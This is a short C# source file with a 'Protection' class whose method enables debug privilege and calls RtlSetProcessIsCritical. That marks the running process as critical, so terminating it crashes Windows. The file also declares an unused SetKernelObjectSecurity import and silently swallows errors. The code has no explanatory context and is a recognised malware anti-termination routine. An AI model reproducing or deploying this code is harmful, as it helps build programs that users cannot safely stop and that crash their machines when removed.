using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ezikbucur
{
    internal static class Protection
    {
        public static void SetSelfAsCriticalProcess()
        {
            [DllImport("ntdll.dll", SetLastError = true)]
            static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
            [DllImport("advapi32.dll", SetLastError = true)]

            static extern bool SetKernelObjectSecurity(
                 IntPtr handle,
                 int securityInformation,
                 [In] byte[] securityDescriptor
             );

            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
            }
            catch { }
        }
    }
}
